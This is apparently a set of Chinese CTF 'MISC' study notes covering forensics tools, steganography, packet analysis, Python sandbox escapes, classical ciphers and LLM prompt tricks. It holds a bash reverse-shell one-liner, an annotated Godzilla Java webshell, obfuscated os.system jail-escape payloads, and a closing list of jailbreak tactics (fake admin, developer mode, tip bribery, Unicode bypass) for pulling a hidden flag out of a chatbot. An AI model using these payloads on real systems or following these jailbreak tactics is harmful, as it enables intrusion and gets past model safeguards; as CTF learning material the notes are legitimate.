# MISC


## 工具

### pngcheck

目录下CMD调用：`pngcheck -v file`

### F5-steganography

```Bash
java Extract ../../Desktop/xxx.jpg -p password
```

### aircrack-ng

### hashcat

```bash
./hashcat -m 22000 -a 3 <path_to_hash_hc22000_file> -1 <custom_charset> ?1?1?1?1?1?1?1?1
# -m 22000 用于 WPA/WPA2 模式
# -a 3 Brute-Force攻击模式
# -1: 所以使用?1, 每个?1代表一个字符位置 --custom-charset1=abcdefg...也可
```



### **Stegsolve**

<img src="/img/misc_note.zh-cn.assets/17284513528809.png" alt="图片无法加载" />

### Volatility

取证工具

```Bash
volatility.exe -f image.vmem imageinfo # 查看镜像的系统信息 获取Win7SP1x64值替换
volatility.exe -f image.vmem --profile=Win7SP1x64 pslist # 查看进程
volatility.exe -f image.vmem --profile=Win7SP1x64 svcscan # 查看服务
volatility.exe -f image.vmem --profile=Win7SP1x64 netscan # 查看网络连接
volatility.exe -f image.vmem --profile=Win7SP1x64 cmdscan # 查看历史cmd命令
volatility.exe -f image.vmem --profile=Win7SP1x64 cmdline # 查看进程命令行参数
volatility.exe -f image.vmem --profile=Win7SP1x64 filescan # 查找所有文件列表
volatility.exe -f image.vmem --profile=Win7SP1x64filescan | findstr ".txt\|.doc\|.zip\|.png" # 相关信息匹配查询
volatility.exe -f image.vmem --profile=Win7SP1x64 filescan | findstr "flag" # 查flag文件
volatility.exe -f image.vmem --profile=Win7SP1x64 privs # 显示进程权限
volatility.exe -f image.vmem --profile=Win7SP1x64 envars # 显示环境变量
volatility -f 1.vmem --profile=Win7SP1x64 hashdump # 查看用户名密码

# 提取文件 -Q 指向内存地址
volatility -f image.vmem --profile=Win7SP1x64 dumpfiles -Q 0x7a09f20 -D D:/out_put_dir
```

### VeraCrypt

当文件是**加密卷**时，可以通过该软件进行磁盘挂载，查看其中文件【点击磁盘，`加载`】

### binwalk

```Bash
binwalk xx.xx
# 分离文件
binwalk -e xx.xx
```

### CyberChef

有终端显示为中文的字节可以使用CyberChef查看

### Wireshark

- 跟踪流的编号查看是否有可疑数据
- 选择原始数据另存为，即使包含其他数据也可解压

### Linux

```bash
# 反向shell连接-维持权限
bash -i > & /dev/tcp/x.x.x.x/port 0 > &1
# -i 交互式
# > & 将标准输出与标准错误重定向, 通过tcp协议连接到目标地址端口
# 标准输入重定向到标准输出
```



## 基础知识

**常见文件头**

| 格式                | 文件头            | 文件尾      |
| ------------------- | ----------------- | ----------- |
| ZIP(zip)            | 50 4B 03 04       | 50 4B       |
| RAR(rar)            | 52 61 72 21       |             |
| JPEG(jpg)           | FF D8 FF          | FF D9       |
| PNG(png)            | 89 50 4E 47       | AE 42 60 82 |
| GIF(gif)            | 47 49 46 38       | 00 3B       |
| TIFF(tif)           | 49 49 2A 00       |             |
| Windows Bitmap(bmp) | 42 4D AE 0A 0B    |             |
| 7-ZIP(7z)           | 37 7A BC AF 27 1C |             |
| avi(RIFF)           | 52 49 46 46       |             |



### 音频

wav文件头：`52494646E6AD250357415645666D7420`

工具: `Audacity`

调整`左右声道`，及`频谱图`等查看

两声道放在不同轨道上：`三点` > `分离立体声到单声道`

**MP3隐写-MP3Stego**

```Bash
.\Decode.exe -P password -X .\xxx.mp3 # 解密

# 需要进入 MP3Stego_1_1_19\MP3Stego 目录下 否则报错
# [Frame    0]OpenTable: could not find tables/huffdec
# Check local directory './tables/'
# Please check huffman table 'huffdec'
```

### 字符串

乱序字符串思路：计算各字符出现**频率排序**

```Python
e = dict() # 使用字典
e.keys() # 键
sorted_dict = dict(sorted(e.items(), key=lambda item: item[1], reverse=True)) # 排序字典
```

### 编码

**Base58**

**核心价值观编码**

`https://ctf.bugku.com/tool/cvecode`网站进行解密

**小鹤双拼**

<img src="/img/misc_note.zh-cn.assets/17284513528791.png" alt="图片无法加载" />

```Bash
xue hui  >  xt hv
```

**brainfuck**

在线解码：`http://www.hiencode.com/brain.html`

只有8个关键字：`>` `<` `+` `-` `.` `,` `[` `]`

### 二维码

- wx直接扫不出时，尝试**汉信码**【唯一一个全面支持我国汉字信息编码强制性国家标准】，使用`https://tuzim.net/hxdecode/`在线工具进行识别
- 或者尝试`ZXing`码，中间一个三回环正方形，使用`https://zxing.org/w/decode.jspx`在线识别

### 图片格式

#### **JPG**

**SOI（文件头）+APP0（图像识别信息）+ DQT（定义量化表）+ SOF0（图像基本信息）+ DHT（定义Huffman表）** DRI（定义重新开始间隔）+ **SOS（扫描行开始）+ EOI（文件尾）**

JPEG文件头：`ffd8 ffe0 0010 4a46 4946`，一般以`ÿØÿà..JFIF`开头

文件结尾：`ffd9`

JPG包含`JFIF`与`Exif`两种文件结构

**更改大小**：可以在010editor中查看以下两个选项

<img src="/img/misc_note.zh-cn.assets/17284513528792.png" alt="图片无法加载" />

#### PNG

文件头：固定八字节为：`89 50 4E 47 0D 0A 1A 0A`

- （固定）四个字节`00 00 00 0D`（十进制13）代表数据块的长度为13
- （固定）四个字节`49 48 44 52`（ASCII码的IHDR）是文件头数据块的标示（IDCH）

PNG文件可以在CyberChef中输入进行**异或**操作，获取加密后文件

**图片宽高修改：010editor中报错**

<img src="/img/misc_note.zh-cn.assets/17284513528793.png" alt="图片无法加载" />

<img src="/img/misc_note.zh-cn.assets/17284513528794.png" alt="图片无法加载" />

爆破CRC获取正确宽高

```Bash
import binascii
import struct

crcbp = open("download.png", "rb").read()    #打开图片
for i in range(2000):
    for j in range(2000):
        data = crcbp[12:16] + \ # IHDR
                struct.pack('>i', i) + \ # 宽 返回字节 >:big-endian, i:int
                struct.pack('>i', j) + \ # 高
                crcbp[24:29]
        crc32 = binascii.crc32(data) & 0xffffffff
        if(crc32 == 0x9a3fc668):    #图片当前CRC
            print(i, j)
            print('hex:', hex(i), hex(j))
```

### 摩尔斯电码

**破译网址**：`https://www.ip138.com/mosi/`，可结合**长短音**，只破译字母和数字，若有其他符号，参考wiki

### 压缩文件

开头一般为：`PK.. (50 4B 03 04)`

```Python
import zipfile # python实现解压缩

with zipfile.ZipFile(file_path, 'r') as zip_ref:
    zip_ref.extractall(output_dir)
```

压缩文件有密码，内容少的话，可以使用CRC校验值爆破

<img src="/img/misc_note.zh-cn.assets/17284513528805.png" alt="图片无法加载" />

此处pwd大小为2字节，遍历2个字符与CRC检验码比较

```Python
from zlib import crc32
def crc32_f(data):
    return hex(crc32(data.encode('utf-8'))&0xffffffff)[2:10] # 获取值的CRC
```

**zip伪加密**

zip由三部分组成：压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志

`50 4B`后一段距离会出现`09 00 08 00`，压缩源文件目录区中`09 00`影响加密属性，数字为奇数时为加密，为偶数时不加密

### NTFS

**NTFS 交换数据流隐写**

NTFS 交换数据流（Alternate Data Streams，简称 ADS），每个文件都有**主文件流**和**非主文件流**

主文件流可直接看到；非主文件流(ADS)寄宿于主文件流中，无法直接读取允许文件携带附加信息

```Bash
# cmd
dir /r
# 2024/07/28  20:54                18 flag.txt
#                                  82 flag.txt:hello.txt:$DATA
#                1 个文件             18 字节
notepad flag.txt:hello.txt # 查看隐藏文件
```

### 3D文件

文件头：`67 6c 54 46 glTF`

在线查看文件内容：`https://products.aspose.app/3d/zh-cn/viewer/gltf`

### 二进制文件

尝试`cat elf`查看是否隐藏信息，可能与执行态无关

## 流量分析

HTTP：`右键` > `追踪流` > `HTTP Stream` 可以看到完整请求内容

### USB

- 流量中存有`HID data`，通过`usb.data_len==8`过滤流量，选中右键**应用为列**
- **`文件`** **>** **`导出分组解析结果`** **>** **`As JSON`**

```Python
import json
# 该字典在https://www.usb.org/sites/default/files/documents/hut1_12v2.pdf
keys = {"5d":"5","5e":"6","5f":"7"} 
data = []

with open('a.json', 'r', encoding='utf-8') as f:
    data = json.load(f)

a1 = []
for i in data:
    try:
        a1.append(i['_source']['layers']['usbhid.data'])
    except Exception as e:
        pass
ans = ""
for x in a1:
    tmp = x[6:8] # 获取第三个字节
    ans+= keys[tmp]
print(ans)
```

**处理数据包**

实现从 n 个数据包中提取其中包含的JPEG图片

<img src="/img/misc_note.zh-cn.assets/17284513528806.png" alt="图片无法加载" />

```Python
from scapy.all import * # 处理网络数据包
from pwn import u32, u64, u16, u8 # 原始字节数据转换为相应长度的无符号整数

packets = rdpcap('flag.pcapng') # 加载
con = b'' # 数据总和

for pkt in packets:
    info = pkt.raw_packet_cache # 字节数据
    offset_addr = u16(info[:2]) # 2字节: USBPcap pseudoheader length
    packet_count = u32(info[0x1f:0x1f+4]) # 4字节: Isochronous transfer number of packets
    
    packet_lens = []
    for i in range(packet_count):
        # 子包的偏移量 0x27: 第一个子包起始位置, 0xc:每个子包头部长(不包括数据)
        off = u32(info[0x27+i*0xc:0x27+i*0xc+4])
        # 子包中数据长度
        packet_len = u32(info[0x27+i*0xc+4:0x27+i*0xc+8])
        packet_lens.append((off, packet_len))

    for off, packet_len in packet_lens: # 每个JPEG文件字节数据
        con += info[offset_addr+off+0xc:offset_addr+off+packet_len]

tmp = con.split(b'\xff\xd8\xff\xe0\x00\x10JFIF')
a = 0
for i in tmp:
    a += 1
    with open(f'./imgs/{a}.jpeg', 'wb') as f:
        f.write(b'\xff\xd8\xff\xe0\x00\x10JFIF' + i)
```

### WIFI

协议**：802.11**，WPA或WEP加密后数据包

```bash
# kali
$ aircrack-ng xxx.cap
   #  BSSID              ESSID                     Encryption
   1  xx:xx:xx:xx:xx:xx  XXXXXXX                   WPA (1 handshake)
```

**无线握手包WIFI密码破解**

`https://hashcat.net/cap2hashcat/`在线将`.cap`文件转换为`.hc22000`格式用于`hashcat`破解密码

### 哥斯拉

webshell管理工具，生成免杀木马，包括base64以及md5函数等

```java
String xc = "key";
String pass = "password";
String md5 = md5(pass + xc);

class X extends ClassLoader {
    public X(ClassLoader z) { // JAVA类通过类加载器ClassLoader动态加载到JVM中
        super(z); // X类继承父类ClassLoader z的特性
    }

    public Class Q(byte[] cb) { // 接收字节码
        // 调用父类的defineClass将字节码转换成定义一个类对象，构造恶意类
        return super.defineClass(cb, 0, cb.length);
    }
}
// 对字节数组加密或解密
public byte[] x(byte[] s, boolean m) {
    try {
        javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
        // init初始化Cipher对象c, 指定密钥xc, 使用AES, 1加密2解密
        c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), "AES"));
        return c.doFinal(s); // 执行加解密操作
    } catch (Exception e) {
        return null;
    }
}
try {
        byte[] data = base64Decode(request.getParameter(pass)); // base64解码pass
        data = x(data, false); // 将data解密
        if (session.getAttribute("payload") == null) {
            // 代码第一次运行，创建自定义类加载器实例，data解析为JAVA类，存储到session的payload中
            session.setAttribute("payload", new X(this.getClass().getClassLoader()).Q(data));
        } else {
            // data存储在http请求的parameters中
            request.setAttribute("parameters", data);
            // 可写入字节数据的输出流
            java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
            // 将session中的payload强制转换为Class类型，调用反射方法实例化对象
            Object f = ((Class) session.getAttribute("payload")).newInstance();
            f.equals(arrOut);
            f.equals(pageContext);
            // 获取响应对象的输出流
            response.getWriter().write(md5.substring(0, 16));
            f.toString();
            // 将流中字节数据转换成字节数组AES加密且base64编码后写入HTTP响应量
            response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));
            response.getWriter().write(md5.substring(16));
        }
    } catch (Exception e) {
}
```



## 图片隐写

### PDF

若PDF图片中有多图层，可现将PDF转为WORD，然后将图片保存载入**Stegsolve**进行不同图层查看

### LSB隐写

Least Significant Bit, PNG图片

png图片存储中，每个颜色表示有8bit，即256种颜色，一共包含256*256*256=16777216种颜色，人类的眼睛可以区分约1,000万种不同的颜色，剩下无法区分的颜色有6777216

<img src="/img/misc_note.zh-cn.assets/17284513528807.png" alt="图片无法加载" />

**LSB隐写:** 修改RGB颜色分量的最低二进制位，即最低有效位（LSB），人类眼睛不会注意到前后变化，且图片携带信息

可以使用**Stegsolve**来进行提取

### IDAT隐写

```bash
$ pngcheck -v x.png
...
chunk IDAT at offset 0x634d0, length 268:  EOF while reading data # IDAT块错误

$ binwalk -e x.png # 提取IDAT块，获取xxx.zlib文件(789C开头)
```

**zlib解压**——解压结果可能为01串/十六进制数/Base64值，再做相应处理

```python
import zlib
import binascii
a = "789c45xxxxx"
re = binascii.unhexlify(a)
ans = zlib.decompress(re)
print(ans)
# b'89504E470D0'
```

返回十六进制数，CyberChef处理

返回01串，若长度为255，尝试转换为二维码

```python
from PIL import Image
MAX = 25
pic = Image.new("RGB",(MAX, MAX))
sttr="01" # 255个
i=0
for y in range (0,MAX):
    for x in range (0,MAX):
        if(sttr[i] == '1'):
            pic.putpixel([x,y],(0, 0, 0))
        else:
            pic.putpixel([x,y],(255,255,255))
        i = i+1

pic.show()
pic.save("flag.png")
```

## 文本隐写

**txt零宽度隐写**

- 零宽度字符：隐藏、不显示、不可打印，大部分程序和编辑器是看不到这种字符，用于调整字符的显示格式
- **隐藏**：需要被加密的内容转换为二进制（Morse编码），该二进制（Morse编码）将被转换为一系列零宽度字符，即可将零宽度的字符串不可见地插入正常文本中隐藏

`https://yuanfux.github.io/zero-width-web/`进行加解密，`vim`可能可以看到零宽度字符

## Python逃逸

```Python
print("\033c") # 终端清屏
```

**os库**

```Python
os.chdir(path) # 切换目录
os.listdir(path) # 列出目录文件
```

**re库** 

正则表达式

```Python
re.match("[\\\+]", code) # [..]匹配括号内任意一个字符, \\匹配\, \+匹配 +
re.search(r'["\'0-8bdhosxy_]|[^\x00-\xff]', code)
# [] 匹配其中内容中的一个, \' 转义: '
# ^ 取反 不匹配后面的范围 \x00-\xff : ASCII码 即匹配任何非ASCII码值
```

**random库**

```Python
random.choices(string.ascii_uppercase + string.digits, k=6) # 6位: 大写字母及数字组成
```

**逃逸**

```Python
dir(__builtins__) # 列出内置命名空间中所有属性和方法

__builtins__.__import__("os").system("cat /tmp/.f*") # 执行命令, *匹配某文件
eval(__import__('os').system('env'))
```

屏蔽后绕过方法

```Bash
# 使用每个单词的chr值即ASCII码值
command = "__import__('os').system('ls')"
exp = ""
for i in command:
    exp += f"chr({ord(i)})+"
print(f"eval({exp[:-1]})")
# eval(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)+chr(40)+chr(39)+chr(111)+chr(115)+chr(39)+chr(41)+chr(46)+chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)+chr(40)+chr(39)+chr(108)+chr(115)+chr(39)+chr(41))
```

**输入限制绕过**

```Python
if len(code) > 15 # 通过延后输入代码解析

eval(input()) # 使用该命令绕过初始限制
```

**重写`eval`屏蔽**

```python
eval(code, {"__builtins__": {"eval": lambda *x: print("sry, no eval for u")}}, {})
# eval(code, globals, locals): globals 和 locals 定义了全局和局部命名空间
# {"__builtins__": {"eval": lambda *x: print("sry, no eval for u")}} 作为全局重写为无论输入什么都只打印
```

```bash
# 绕过
[klass for klass in "".__class__.__base__.__subclasses__() if klass.__name__ == "BuiltinImporter"][0].load_module("builtins").__import__("os").system("ls")

# "".__class__: 获取<class 'str'>
# .__base__: 获取基类<class 'object'>
# .__subclasses__(): 返回object类所有子类列表
# 列表推导式筛选出BuiltinImporter的类——用于导入内置模块
# [0]取出第一个元素BuiltinImporter类
# .load_module("builtins"): 加载builtins模块，包含python所有内置对象和函数
# .__import__("os").system("ls") # 执行命令
```



## 密码

**凯撒密码**

```Python
a = "encrypt_data"
shift = 5
text = ""

for char in a:
    if char.isalpha():
        shift_base = ord('A') if char.isupper() else ord('a')
        text += chr((ord(char) - shift_base + shift) % 26 + shift_base)
    else:
        text += char

print(text)
```

**福尔摩斯跳舞小人加密**

<img src="/img/misc_note.zh-cn.assets/17284513528808.png" alt="图片无法加载" />

**佛与论禅**

`http://hi.pcmoe.net/buddha.html`解密

## AI

### Prompt

1. 模仿`admin: xxxx`
2. 要求编写代码将flag输出
3. 进入开发者模式
4. 停止扮演
5. 括号逃逸：先输入`] `，再输入`[ `
6. 小费攻击：对回答评分，基于评分给小费
6. 使用+将flag切割：`fl+ag`
6. 用逗号分隔
6. 换行空一行输入
6. 侧信道一个一个爆破问

**绕过**

- Unicode编码绕过进行越狱，找与对应ASCII码相等的Unicode码

> - 寻找平替在线网站
> - https://zh.wikipedia.org/wiki/Unicode%E5%AD%97%E7%AC%A6%E5%88%97%E8%A1%A8
> - https://symbl.cc/cn/
